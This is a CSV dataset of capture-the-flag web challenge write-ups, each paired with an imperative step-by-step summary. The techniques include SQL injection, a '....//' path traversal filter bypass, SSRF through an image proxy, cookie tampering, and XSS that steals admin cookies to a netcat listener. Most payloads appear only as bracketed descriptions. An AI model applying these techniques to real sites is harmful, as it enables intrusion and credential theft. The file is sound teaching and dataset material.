"text","summary"
"Analyzing `http://35.207.189.79/pyserver/server.py` some interesting snippets can be discovered.

The vulnerable functionality is the following, because the query contains parameters replaced and not sanitized.

[Python Flask API: Retrieve projects from the database based on the sorting criteria and offset value. Verify user is an admin and return the result as a JSON response]

To obtain the `token` value, a login with `admin` user must be performed. The `token` will be set into the cookies. The login can be performed like in the [Logged In challenge](https://github.com/m3ssap0/CTF-Writeups/tree/master/35C3%20Junior%20CTF/Logged%20In).

The `DB_SECRET` variable, with the flag, is stored in another table that can be discovered in the following function.

[Python function: Initialize database with migration script and a secrets table containing a single row with a secret value]

At this point a SQL injection payload can be crafted and sent to the server. The complete request with SQL injection payload is the following.

[HTTP POST: request with SQL Injection payload to retrieve project secrets]

The answer will be the following.

[HTTP response: Server returns a JSON object with one element containing null values for keys code, content, created, lastModified, public, title, and type; a non-null value for the key userName with the value of the flag]

So I got the flag.
","Analyze the Python Flask API at `http://35.207.189.79/pyserver/server.py` and identify the vulnerable functionality due to unsanitized parameters.

Perform a login as an admin user to obtain the `token` value, which will be set in the cookies.

Identify the `DB_SECRET` variable containing the flag, which is stored in another table.

Craft a SQL injection payload to target the vulnerable functionality.

Send the HTTP POST request with the SQL injection payload to the server.

Examine the HTTP response containing a JSON object with null values for most keys and a non-null value for the key userName with the flag value.

Retrieve the flag.
"
"The page shows the PHP snippet of which is composed and an image.

The PHP code is the following.

[PHP code that retrieves an image file based on the user's preferred language. The code is vulnerable to directory traversal attacks since it does not properly sanitize the input received from the user.]

The web site extracts the language passed via HTTP header, considers the first language and tries to load a picture from the `flags` folder; that picture will be displayed.

Even if the `str_replace('../', '', $lang)` instruction is used, the path traversal vulnerability is still present and can be abused using `....//` instead of `../`.

After some attempts, you will discover the correct HTTP header to use.

[HTTP header tampering attempt with path traversal payload to potentially retrieve a flag]

The returned ""image"" will be the following.

``[HTML image tag with base64-encoded JPEG data]

Decoding the Base64 will give you the flag.","Examine the PHP code snippet on the page, which is vulnerable to directory traversal attacks due to improper input sanitization.

Understand that the website retrieves the user's preferred language from the HTTP header and tries to load a corresponding image from the `flags` folder.

Exploit the path traversal vulnerability by using `....//` instead of `../`, bypassing the `str_replace('../', '', $lang)` instruction.

Craft an HTTP header tampering attempt with the path traversal payload to potentially retrieve a flag.

Analyze the returned ""image"" containing base64-encoded JPEG data.

Decode the base64 data to obtain the flag.
"
"Analyzing `http://35.207.189.79/pyserver/server.py` two interesting methods can be discovered.

The header is set in the following method.

[Python function to add security headers to HTTP responses with special handling for localhost requests]

The functionality that can be abused to generate a request from the same server is the following.

[Flask route to proxy and serve images, with basic validation checks]

This is the functionality used by the `loadImage` method in the programming environment.

The server runs at what defined here:

[Python script: starts a web application and listens for incoming HTTP requests on all available network interfaces at port 8075.]

An image is mandatory to abuse the service, because the Content-Type is strictly checked, but three extensions are blacklisted in the code that sets the target header.

Hence, the following image can be used: `img/paperbots.svg`.

The exploit is performed with a GET request like the following (or using `0.0.0.0` for the IP address).

[HTTP GET request to fetch an image from a remote server via a proxy endpoint]
    
The response will contain the flag.","Analyze `http://35.207.189.79/pyserver/server.py` to find two interesting methods related to security headers and proxying images.

Understand the server's functionality in adding security headers and proxying images with basic validation checks.

Identify that the server listens for incoming HTTP requests on all available network interfaces at port 8075.

Determine that an image is required to exploit the service, and choose `img/paperbots.svg` as the image.

Perform the exploit with an HTTP GET request, fetching the image from a remote server via a proxy endpoint (or using `0.0.0.0` for the IP address).

Receive the response containing the flag.
"
"The web site does not send double opt-in e-mail. A user can be registered, but the e-mail with the ""magic code"" needed to login will not be received.

Analyzing the response of the authentication API (i.e. `http://35.207.189.79/api/login`) a code can be found in the payload returned by the server. That code is the magic one that must be inserted in the window to complete the login.

After the login, a cookie will be set with the flag.","Understand that the website does not send a double opt-in email with a magic code for user login.

Analyze the authentication API response at `http://35.207.189.79/api/login` to find the magic code in the server's returned payload.

Use the magic code to complete the login process.

Receive a cookie containing the flag after successful login.
"
"Visiting `http://35.207.91.38/robots.txt` will reveal the following content.

[Robots.txt file that disallows web crawlers from accessing the "".DS_Store"" file in the ""/backup/"" directory]

So the `http://35.207.91.38/backup/.DS_Store` will download a `.DS_Store` file.

According to Wikipedia: in the Apple macOS operating system, .DS_Store is a file that stores custom attributes of its containing folder, such as the position of icons or the choice of a background image.

The ds_store_exp script could be used to download and extract hidden data.

[Python script for exploiting .DS_Store files on a web server]","Visit `http://35.207.91.38/robots.txt` to find the content disallowing access to the "".DS_Store"" file in the ""/backup/"" directory.

Access `http://35.207.91.38/backup/.DS_Store` to download the `.DS_Store` file.

Understand that .DS_Store files in macOS store custom attributes of their containing folder.

Use the ds_store_exp script to exploit the downloaded .DS_Store file and extract hidden data.
"
"Analyzing the HTML, you can find the following comment.

[HTML comment indicating that the source code for a project or website is located in a file named ""src.tgz"". The "".tgz"" extension usually indicates that the file has been compressed using the gzip utility.]

The archive contains both the frontend and the backend code.

Into the backend file `app.rb` you can discover the backend endpoint that must be called to retrieve the flag.

[Ruby code defining a web application route that returns the contents of the ""flag.txt"" file when the path ""/admin"" is accessed.]

The code that can be abused is into frontend `view.php` file.

[PHP code that checks if a file exists and has specific contents before outputting the contents of another file with a certain ID obtained from a backend server.]

The `int` cast is not present everywhere, so the `id` parameter can be crafted like the following.

[A relative file path or URL that goes two directories up from the current directory and then accesses a directory named ""admin"".]

With this parameter, the first two `if` statements will be true, because the result of the expression is the following, due to the fact that PHP will consider only the integer part for the cast.

[File path pointing to a password-protected file or directory.]

That result is a valid password file, the one created previously during the note submission.

The `file_get_contents` instruction will perform a HTTP GET call to the following backend endpoint.

That will be interpreted like `$BACKEND/admin`

Hence, the flag will be returned.","Analyze the HTML to find a comment indicating the location of the ""src.tgz"" file containing the project source code.

Extract the frontend and backend code from the ""src.tgz"" file.

Examine the backend file ""app.rb"" to discover the backend endpoint that returns the flag when the path ""/admin"" is accessed.

Identify vulnerable code in the frontend ""view.php"" file.

Craft an ""id"" parameter that bypasses the first two ""if"" statements in the PHP code by exploiting the lack of an ""int"" cast.

Use the crafted ""id"" parameter to make the ""file_get_contents"" instruction perform an HTTP GET call to the backend endpoint.

Access the backend endpoint at `$BACKEND/admin` to retrieve the flag.
"
"The page shows the PHP snippet of which is composed (I added the comments with numbers on interesting lines of code).

[PHP code with conditional statements that checks whether a given password input in the URL query parameter satisfies three conditions before outputting a secret flag. The code also includes a fallback to highlight the source code file if the password parameter is not provided.]

The `if` statement *#1* is useless for the analysis. `$_` is a normal variable populated with `pass` URL parameter content and the `@` clause does not affect anything in our scenario.

The `if` statement *#2* can be bypassed using the same value for `pass` URL parameter and for the User-Agent, because PHP's `==` gets confused with type conversions, lol.

The `if` statement *#3* contains the secret flag into a MD5 calculation, so it could seem hard to bypass, but:
* the MD5 hash can only have hex values from `0` to `f`;
* only the first char of two strings is considered in the comparison.

So the value of `$_[0]` can be between `0` and `f` only.

Trying single chars, from `0` to `f`, for the input of `pass` and User-Agent header, will reveal that `b` is the char that returns the flag.","Examine the PHP code snippet on the page that checks password input against three conditions before revealing a secret flag.

Determine that the first ""if"" statement is not relevant for the analysis.

Bypass the second ""if"" statement by using the same value for the `pass` URL parameter and the User-Agent header, exploiting PHP's `==` type conversion confusion.

Recognize that the third ""if"" statement contains the secret flag within an MD5 calculation, and the comparison only considers the first character of two strings.

Understand that the value of `$_[0]` can only be a single hex character from `0` to `f`.

Test single hex characters from `0` to `f` for both the `pass` input and the User-Agent header.

Discover that using the character `b` for both the `pass` input and the User-Agent header returns the flag.
"
"In the home page of the website there is the following HTML comment at the end.

[HTML comments containing the first part of the flag, and that the rest of the flag can be found on the ""d4rks0c1ety"" page.]

On the other page, you can find another HTML comment at the beginning.

[HTML comments containing the second part of the flag]

So we got the flag.","Examine the home page of the website to find an HTML comment at the end containing the first part of the flag.

Navigate to the ""d4rks0c1ety"" page as mentioned in the comment.

Locate another HTML comment at the beginning of the page containing the second part of the flag.

Combine the two parts to obtain the complete flag.
"
"The website home page contains a login form.

Analyzing browser cookies, you can find that admin_id is 0.

Changing it to 1 and refreshing the page will give you the flag.","Visit the website home page and locate the login form.

Examine browser cookies to find that the admin_id is set to 0.

Modify the admin_id value to 1 and refresh the page.

Obtain the flag upon refreshing the page.
"
"Analyzing the browser console, you can find an error:

[Error message indicating a syntax error in the jQuery library file ]

Going to that portion of the JavaScript file will reveal the flag.","Inspect the browser console to find an error message.

Identify the syntax error in the jQuery library file from the error message.

Navigate to the portion of the JavaScript file where the error is located.

Locate and retrieve the flag within the JavaScript file.
"
"In the home page of the website there is a strange message:
Wow INSTRUO team loves :cookie:

Analyzing browser cookies, you can find the flag encoded in base 64.

Decoding the Base64 cookie value will give you the flag","Visit the website home page and notice the strange message about INSTRUO team loving cookies.

Inspect browser cookies to find the flag encoded in base64.

Decode the base64 cookie value to obtain the flag.
"
"The website is a game where you have to click on the circle and don't click on the squares, both located on random positions each round. You have to click more than 20 times in 10 seconds.

[HTML code defining the structure and content of a web page, including links to external CSS and JavaScript files, and a canvas element.]

The [frontend source](main.js) is heavily obfuscated, but the challenge gives you the [backend source](index.js).

[Node.js server-side JavaScript code that creates an HTTP server using the Express.js library, which serves an HTML page containing a game. The game involves clicking on shapes that are randomly generated on the page, with the objective of earning a score greater than 20 within a 10-second time limit. If the player's score is high enough, the server will emit a message containing the flag.]

From this source code you can discover that positions are sent to the client into a JSON array and that the winning position is the first one sent.

Analyzing the HTTP traffic you can discover the format of each request/response packet and you can use this information to develop [your own client](solver-woooosh.py) able to win each round of the game.

[Python script that plays a game through a website's API. The game is identified by a URL stored in the ""target_site"" variable. The script communicates with the API through HTTP requests, sending and receiving data in JSON format. The script uses the ""requests"" library to send HTTP requests and the ""time"" and ""math"" libraries to generate timestamps and perform arithmetic operations, respectively.]

The flag is the following.","Visit the website, which features a game requiring players to click on circles and avoid squares, aiming for a score above 20 within 10 seconds.

Examine the frontend and backend source codes, noting that the frontend code is obfuscated and the backend code reveals that positions are sent to the client in a JSON array with the winning position being the first one.

Analyze HTTP traffic to determine the format of request/response packets.

Develop a custom client, utilizing the discovered information, capable of winning each round of the game.

Use the custom client to play the game and obtain the flag.
"
"The title reminds the XSS vulnerability.

The page can be used to post a message with an XSS attack. For example using an `img` tag like the following.

[HTML code for an image element with a ""src"" attribute pointing to ""foo.png"". The ""onerror"" attribute is set to execute JavaScript code that redirects the user to a specific URL while appending the document's cookie as a parameter.]

The website will return a code that can be used to identify the posted message.

The resulting code can be sent to administrator via the report page.

On a server listening with `nc`, you will receive the admin cookies.

[Terminal output showing a network connection being established and a GET request being made with various HTTP headers and parameters.]

Then the cookie can be used to perform a request to the admin page.

[HTTP request and response headers and body for a web page. The response body contains HTML code for an admin landing page with a secret cookie authentication system.]

The flag is the following.","Recognize that the challenge title suggests an XSS vulnerability.

Post a message containing an XSS attack using an `img` tag with a crafted ""onerror"" attribute to execute JavaScript code.

Receive a code from the website to identify the posted message.

Send the resulting code to the administrator via the report page.

Set up a server listening with `nc` to receive the admin cookies from the XSS attack.

Use the obtained admin cookies to perform a request to the admin page.

Retrieve the flag from the admin page response.
"
